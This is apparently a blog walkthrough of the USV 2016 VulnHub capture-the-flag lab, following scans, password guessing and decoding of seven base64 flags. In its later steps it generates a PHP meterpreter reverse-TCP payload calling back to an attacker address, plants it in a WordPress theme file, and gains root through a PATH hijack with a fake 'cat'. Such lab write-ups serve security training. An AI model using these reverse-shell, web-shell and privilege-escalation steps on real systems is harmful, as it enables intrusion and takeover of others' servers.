@@ -1,0 +1,525 @@
+
+								
+																		Hack the USV VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on January 26, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									A new challenge for all of you guys!
+This CTF is all about conquering flags coming across our way as we go further in our penetration testing of this lab.  All the flags should be discovered in form of: Country name Flag:[md5 hash]. The network interface of this virtual machine will take it’s IP settings from DHCP.
+Download lab from here: https://www.vulnhub.com/entry/usv-2016-v101,175/
+Let’s get started with our first step.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+From this, we get our target IP.
+Target IP: 192.168.0.103
+
+Now we will scan it with nmap which will give us all the open ports in a particular lab for further penetration testing.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.0.103
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.0.103
+					
+				
+			
+		
+
+This result shows that the following ports are open 22, 80, 3129, 3306, 21211 and http proxy is used on port 3129.
+
+So now let’s proceed with further penetration testing. Firstly we’ll go with ssh on port 22.
+
+		
+		
+			
+			
+			
+			
+ssh 192.168.0.103
+			
+				
+					
+				
+					1
+				
+						ssh 192.168.0.103
+					
+				
+			
+		
+
+Ssh revealed a ascii Dragon with some strings and a base64 code written at the bottom. Looking closer you’ll see something written on top AES-ECB.
+
+By Google search, we found out that there is a website called aesencryption.net where we can decrypt the base64 code we got in our last result. So we will decrypt that code with the given key in the image by all this process we arrived at our 1st flag i.e ITALY FLAG
+
+Ok so now let’s head towards the second flag and for that, we are going to open target IP in the browser as port 80 is also open. Look at that. We got access forbidden. No result.
+
+As we opened target IP in browser simultaneously we have captured the cookies through burp suite after setting the manual proxy in the browser. When all this is done, right click on its window where intercepted data is fetched and a kind of action list will put on view further click to send to the repeater.
+Look over screenshot below you will find two panels left and right for request and response respectively. In the response window, the highlighted text is our flag.
+
+As this code is in base64 so we are going to use HackBar plugin in Mozilla Firefox which is preinstalled or can be easily installed. Whoa decoding the code in it we got another flag which is our second flag i.e. CROATIA FLAG
+
+Moving ahead, from our nmap result we got that http-proxy is set on port 3129 so we will set the proxy setting for our target IP with port number 3129 as shown below.
+
+Now try opening target IP in a browser and wait for a few seconds like 10 sec. The proxy setting did the trick and website reveals a single page with a changing banner of “WINTER IS COMING” and “ALL MEN MUST DIE”. Some of you may be aware of this but for those who do not know about this. It is Games of Thrones.
+
+The site didn’t show much so I used Nikto scanner with a proxy to get some information about it which will be helpful in further testing.
+
+		
+		
+			
+			
+			
+			
+nikto -h 192.168.0.103 –useproxy  http://192.168.0.103:3129
+			
+				
+					
+				
+					1
+				
+						nikto -h 192.168.0.103 –useproxy  http://192.168.0.103:3129
+					
+				
+			
+		
+
+It reveals a WordPress login at /blog.
+
+Ok!  Now open it in the browser. Great, Games of Thrones notion is confirmed as Seven Kingdoms blog is shown.
+Scrolling down in this site you can see that there is an interesting second post which shows ‘I have a message for you’. There is a highlighted option so just try to open it in the browser.
+
+Awesome!!!! This reveals a message and a download link for a zip file. Interesting, so go ahead and download it.
+
+
+Unzipping the file shows an image of a man with a bottle of perfume and a base64 encoded string at the bottom.
+
+Here we decrypt the code in the hackbar plugin which results in another flag. From this step, we got our third flag i.e. PORTUGAL FLAG
+
+ Now, returning to the previous site there are several posts which are all useless so just scroll down to see if there is something useful or not and then comes the last post which is of our interest.
+‘Protected: the secret chapter ‘
+
+Oh! We have to provide a password to get through it. This one took some time and to spare your time I won’t go through my failures,
+I have created a dictionary of possible passwords which are nothing but some of the words in this whole page with the help of the following command.
+
+		
+		
+			
+			
+			
+			
+cewl -d 2 -m 5 --proxy_host 192.168.0.103 --proxy_port 3129 -w /root/Desktop/dict.txt http://192.168.0.103/blog/
+			
+				
+					
+				
+					1
+				
+						cewl -d 2 -m 5 --proxy_host 192.168.0.103 --proxy_port 3129 -w /root/Desktop/dict.txt http://192.168.0.103/blog/
+					
+				
+			
+		
+
+
+From the list we get that password is ‘westerosi’
+Using this password we came to another page which revealed another flag in base64 encoded string and below it some kind of images of an actress.
+
+ Now again decrypt it in and as a result, we have our fourth flag i.e. PARAGUAY FLAG
+
+Moving to one level up, from the site we got another message that “the mother_of_dragons has a password which is in right front of your eyes”.
+Knowing nothing about the eyes of actress I restored to google to see if I get any clue from there but no such luck.
+I looked at the message again and it states ‘password which is in front of your eyes’
+That’s the password of mother_of_dragons is ‘in front of your eyes’. But wait a minute where is this password is used.
+We have an FTP service running. So let’s try and get through it
+
+		
+		
+			
+			
+			
+			
+ftp 192.168.0.103 21211
+ls –al
+get .note.txt
+exit
+cat .note.txt
+			
+				
+					
+				
+					12345
+				
+						ftp 192.168.0.103 21211ls –alget .note.txtexitcat .note.txt
+					
+				
+			
+		
+
+bingo! Here that password is used. At the bottom result shows that children’s name is used for the password. Again a password but this time it is used for WordPress login which we are going to use in coming steps.
+
+Again I googled and found out she doesn’t have any children rather had 3 dragons named Drogon, Rhaegal, and Viserion. So I put all these names into a file along with all possible combinations.
+The list is small so by entering each one the desired password could find out.
+Password is RhaegalDrogonViserion
+
+Apply the credentials for WordPress and we are in!
+Looking around the site I found the profile section which reveals the base64 encoded string for mother_of_dragons.
+
+Like always decode the base64 code in HackBar and here we have another flag.
+This is our fifth flag i.e. THAILAND FLAG
+
+Now with only 2 flags left its time for shell access as we have WordPress.
+Moving further, firstly make a php code through msfvenom which can be used to get the meterpreter session.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.104 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.104 lport=4444 -f raw
+					
+				
+			
+		
+
+
+Being admin of the site I am able to edit the theme. So I replaced the 404.php code of template in Viking theme with the above-highlighted php code.
+
+On the other side to get the meterpreter session open kali terminal and run multi handler. And for that type the following commands.
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.0.104
+set lport 4444
+exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.0.104set lport 4444exploit
+					
+				
+			
+		
+
+as we have a meterpreter session, now go to shell and type following commands
+
+		
+		
+			
+			
+			
+			
+echo "import pty; pty.spawn('/bin/bash')" &amp;gt; /tmp/asdf.py
+python /tmp/asdf.py
+			
+				
+					
+				
+					12
+				
+						echo "import pty; pty.spawn('/bin/bash')" &amp;gt; /tmp/asdf.pypython /tmp/asdf.py
+					
+				
+			
+		
+
+
+
+		
+		
+			
+			
+			
+			
+cd /srv/http
+ls
+			
+				
+					
+				
+					12
+				
+						cd /srv/httpls
+					
+				
+			
+		
+
+it shows a reward_flag.txt file so call it with the cat command
+cat reward_flag.txt 
+As a result, we get a base64 encoded string.
+
+Do not worry soon this decoding thing is going to over as we have the sixth flag with this decoding. So, as a result, our sixth flag is MONGOLIA FLAG
+
+Back to another file in the above list of files i.e. winterfell_messenger .  We see its executable and owner is root. So run it with the following command
+
+		
+		
+			
+			
+			
+			
+./winterfell_messenger
+cat /root/message.txt
+			
+				
+					
+				
+					12
+				
+						./winterfell_messengercat /root/message.txt
+					
+				
+			
+		
+
+It shows that it’s using the cat command to read a file in the /root directory.
+Using strings shows that cat command is being used; however, it’s not using the full path to the program. From this, we come to know that it will search for set PATH to run.
+
+ Now, we are able to update PATH by using export but first, we need to find out the writable directory and for that, we have used /tmp. In /tmp, we will create an executable file named cat so it can be called by the winterfell_messenger program. This file will be running as root so we will use /bin/bash to call shell and to change the mode. Run the following commands.
+
+		
+		
+			
+			
+			
+			
+echo "/bin/bash" &gt; /tmp/cat
+chmod 777 /tmp/cat
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+			
+				
+					
+				
+					1234
+				
+						echo "/bin/bash" &gt; /tmp/catchmod 777 /tmp/catecho $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+					
+				
+			
+		
+
+After this step, we are going to update the PATH to remove the /tmp directory we added. For this type the following commands.
+
+		
+		
+			
+			
+			
+			
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+			
+				
+					
+				
+					1
+				
+						export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+					
+				
+			
+		
+
+Now, we will go to the home directory of http to get the desired file. For that type
+
+		
+		
+			
+			
+			
+			
+cd /srv/http
+ls
+			
+				
+					
+				
+					12
+				
+						cd /srv/httpls
+					
+				
+			
+		
+
+now call the winterfell_messenger file by using given command.
+
+		
+		
+			
+			
+			
+			
+./winterfell_messenger
+id
+			
+				
+					
+				
+					12
+				
+						./winterfell_messengerid
+					
+				
+			
+		
+
+
+Now go to root and there we have .flag.txt file.
+Now running cat against .flag.txt we get congratulations, a wolf made up of ascii characters and a base64 encoded string at the bottom. Commands are given below.
+
+		
+		
+			
+			
+			
+			
+cd /root
+/usr/sbin/cat .flag.txt
+			
+				
+					
+				
+					12
+				
+						cd /root/usr/sbin/cat .flag.txt
+					
+				
+			
+		
+
+
+Finally decoding in hackbar reveals the seventh and last flag which is nothing but the SOMALIA FLAG
+
+Whoola. We reached at the end and with this job is done. Hope you enjoyed it and obviously, penetration skills are refreshed.
+Author: Priya Singh is an enthusiast researcher and technical writer at hacking articles. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
